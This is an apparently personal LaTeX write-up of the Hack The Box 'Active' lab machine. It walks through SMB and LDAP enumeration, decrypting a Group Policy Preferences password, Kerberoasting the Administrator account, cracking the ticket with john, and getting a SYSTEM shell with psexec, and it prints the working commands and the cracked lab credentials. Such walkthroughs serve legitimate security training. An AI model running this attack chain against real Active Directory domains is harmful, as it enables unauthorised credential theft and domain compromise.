\chapter{Active}
\begin{itemize}
    \item {\bf technics}: spn attack
    \item {\bf Components}: 
    \item {\bf tools}: gpocrack
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.10.100
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 12:14 CEST
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-30 10:14:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-30T10:15:44
|_  start_date: 2022-09-30T08:33:52
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required

\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.10.100

===========================================================
|    Domain Information via SMB session for 10.10.10.100    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: ACTIVE
DNS domain: active.htb
FQDN: DC.active.htb
Derived membership: domain


[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: DENIED
[*] Testing share NETLOGON
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Users
[+] Mapping: DENIED, Listing: N/A
\end{verbatim}


\begin{verbatim}
$ smbmap -H 10.10.10.100 -R --depth 10

        .\Replication\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 12:38:11 2018    GptTmpl.inf
        .\Replication\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 12:38:11 2018    Groups.xml
        .\Replication\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 12:38:11 2018    GptTmpl.inf
\end{verbatim}

\verb+Groups.xml+:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
   <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1 }" 
      name="active.htb\SVC_TGS" image="2" 
      changed="2018-07-18 20:46:06" 
      uid="{EF57DA28-5F69-4530-A59E-AAB585 78219D}">
      <Properties action="U" newName="" fullName="" description="" 
        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
        changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" 
        userName="active.htb\SVC_TGS" />
   </User>
</Groups>
\end{verbatim}

\verb+GptTmpl.inf+:
\begin{verbatim}
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Version]
signature="$CHICAGO$"
Revision=1
\end{verbatim}

\href{https://github.com/t0thkr1s/gpp-decrypt}{gpp-decrypt}

\begin{verbatim}
$ gpocrack 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
Password is: GPPstillStandingStrong2k18
\end{verbatim}


\subsubsection{smb2}

\begin{verbatim}
$ enum4linux-ng -A 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
 =====================================
|    Users via RPC on 10.10.10.100    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 4 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 4 user(s) via 'enumdomusers'
[+] After merging user results we have 4 user(s) total:
'1103':
  username: SVC_TGS
  name: SVC_TGS
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account
\end{verbatim}


\subsubsection{ldap}
\begin{verbatim}

benmusashi@honbu:~/documents/pentesting-games/htb/active$ windapsearch -d active.htb --dc-ip 10.10.10.100 -u 'svc_tgs@active.htb' -p GPPstillStandingStrong2k18 -U --full
[+] Using Domain Controller at: 10.10.10.100
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=active,DC=htb
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:ACTIVE\SVC_TGS

[+] Enumerating all AD users
[+]     Found 4 users:

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=active,DC=htb

.. SNIP ..
servicePrincipalName: active/CIFS:445
.. SNIP ..
\end{verbatim}




\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -request -outputfile hash.admin
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2022-09-30 10:35:00.048952


$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.admin
$ john --show hash.admin
?:Ticketmaster1968



$ evil-winrm -i 10.10.10.100 -u administrator -p Ticketmaster1968
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.10.100" port 5985 (10.10.10.100:5985)

Error: Exiting with code 1

\end{verbatim}

\begin{verbatim}
$ psexec.py  administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file foMCfbHt.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service wOHM on 10.10.10.100.....
[*] Starting service wOHM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

\end{verbatim}

\section{Theorie}


